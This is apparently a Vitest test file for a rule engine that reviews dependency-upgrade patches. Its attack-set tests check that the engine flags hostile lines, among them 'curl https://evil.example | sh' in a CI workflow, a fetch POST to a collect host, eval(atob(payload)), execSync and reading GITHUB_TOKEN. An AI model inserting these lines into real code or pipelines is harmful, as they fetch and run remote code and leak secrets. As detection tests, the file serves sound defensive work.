import { describe, expect, it } from "vitest";
import { parsePatch } from "../../src/review/patch.ts";
import { applyRules } from "../../src/review/rules.ts";
import type { ChangeRecord } from "../../src/schemas/change-record.ts";

const record: ChangeRecord = {
  schema: "change-record/1",
  package: "pkg:npm/nanoid",
  from: "4.0.2",
  to: "5.0.9",
  record_version: 1,
  changes: [],
  codemods: [],
  min_runtime: {},
  sources: [],
  created_at: "2026-11-16T00:00:00Z",
};

function patchFor(path: string, added: string[], removed: string[] = []) {
  return `diff --git a/${path} b/${path}\n--- a/${path}\n+++ b/${path}\n@@ -1 +1 @@\n${removed.map((l) => `-${l}`).join("\n")}\n${added.map((l) => `+${l}`).join("\n")}\n`;
}

const run = (patch: string) =>
  applyRules({
    ecosystem: "npm",
    packageName: "nanoid",
    files: parsePatch(patch),
    record,
    edits: [],
  });

describe("diff rules (attack set)", () => {
  it("blocks edits to CI workflows", () => {
    expect(
      run(patchFor(".github/workflows/ci.yml", ["run: curl https://evil.example | sh"])).some(
        (f) => f.rule === "protected_path" && f.severity === "block",
      ),
    ).toBe(true);
  });
  it.each([
    ["network_call", 'await fetch("https://collect.example/x", { method: "POST", body: data })'],
    ["process_execution", 'require("child_process").execSync("id")'],
    ["dynamic_code", "eval(atob(payload))"],
    ["env_access", "const t = process.env.GITHUB_TOKEN;"],
    ["encoded_blob", `const x = "${"QUJD".repeat(60)}";`],
  ])("blocks %s", (rule, line) => {
    const f = run(patchFor("src/ids.ts", [line]));
    expect(f.some((x) => x.rule === rule && x.severity === "block")).toBe(true);
  });
  it("does not flag pre-existing lines that only moved", () => {
    const line = "const t = process.env.NODE_ENV;";
    expect(run(patchFor("src/a.ts", [line], [line])).some((f) => f.rule === "env_access")).toBe(
      false,
    );
  });
  it("blocks new dependencies and install scripts in package.json", () => {
    const f = run(
      patchFor(
        "package.json",
        ['    "left-pad": "^1.3.0",', '    "postinstall": "node x.js",'],
        [],
      ),
    );
    expect(f.some((x) => x.rule === "new_dependency")).toBe(true);
    expect(f.some((x) => x.rule === "install_script")).toBe(true);
  });
  it("allows bumping the upgraded package itself", () => {
    expect(
      run(patchFor("package.json", ['    "nanoid": "^5.0.9"'], ['    "nanoid": "^4.0.2"'])),
    ).toEqual([]);
  });
  it("warns when tests lose assertions", () => {
    const f = run(patchFor("src/ids.test.ts", [], ["  assert.match(id, /x/);"]));
    expect(f.some((x) => x.rule === "tests_weakened" && x.severity === "warn")).toBe(true);
  });
  it("ignores lockfile size but limits code diff size", () => {
    const big = Array.from({ length: 500 }, (_, i) => `line ${i}`);
    expect(run(patchFor("package-lock.json", big)).length).toBe(0);
    expect(run(patchFor("src/a.ts", big)).some((x) => x.rule === "diff_too_large")).toBe(true);
  });
});

describe("rule refinements from the benchmark", () => {
  const files = (path: string, added: string[], removed: string[] = []) =>
    parsePatch(
      `diff --git a/${path} b/${path}\n--- a/${path}\n+++ b/${path}\n@@ -1 +1 @@\n${removed.map((l) => `-${l}`).join("\n")}\n${added.map((l) => `+${l}`).join("\n")}\n`,
    );
  it("allows required peer dependencies of the new version", () => {
    const f = applyRules({
      ecosystem: "npm",
      packageName: "vitest",
      files: files("package.json", ['    "vite": "^7.0.0",']),
      record,
      edits: [],
      peerDependencies: ["vite"],
    });
    expect(f.some((x) => x.rule === "new_dependency")).toBe(false);
  });
  it("allows rewriting network code when upgrading an HTTP client", () => {
    const f = applyRules({
      ecosystem: "npm",
      packageName: "node-fetch",
      files: files("lib/fetch.js", ["module.exports = function fetch() {"]),
      record,
      edits: [],
    });
    expect(f.some((x) => x.rule === "network_call")).toBe(false);
  });
  it("warns (not blocks) on network calls in files that already made them", () => {
    const f = applyRules({
      ecosystem: "npm",
      packageName: "zod",
      files: files("src/api.ts", ['await fetch(url, { method: "POST" })'], ["await fetch(url)"]),
      record,
      edits: [],
    });
    expect(f.some((x) => x.rule === "network_call" && x.severity === "block")).toBe(false);
  });
  it("warns on rewritten env access (execa/kafkajs case)", () => {
    const f = applyRules({
      ecosystem: "npm",
      packageName: "execa",
      files: files(
        "src/run.ts",
        ["await execa(cmd, { env: { PATH: process.env.PATH } })"],
        ["await execa(cmd, [], { env: { PATH: process.env.PATH }, extendEnv: false })"],
      ),
      record,
      edits: [],
    });
    expect(f.filter((x) => x.severity === "block")).toEqual([]);
  });
  it("still blocks eval even when the file had one before", () => {
    const f = applyRules({
      ecosystem: "npm",
      packageName: "zod",
      files: files("src/x.ts", ["eval(payload + 1)"], ["eval(payload)"]),
      record,
      edits: [],
    });
    expect(f.some((x) => x.rule === "dynamic_code" && x.severity === "block")).toBe(true);
  });
  it("still blocks new network calls elsewhere", () => {
    const f = applyRules({
      ecosystem: "npm",
      packageName: "zod",
      files: files("src/schema.ts", ['fetch("https://x.example", { body })']),
      record,
      edits: [],
    });
    expect(f.some((x) => x.rule === "network_call" && x.severity === "block")).toBe(true);
  });
});
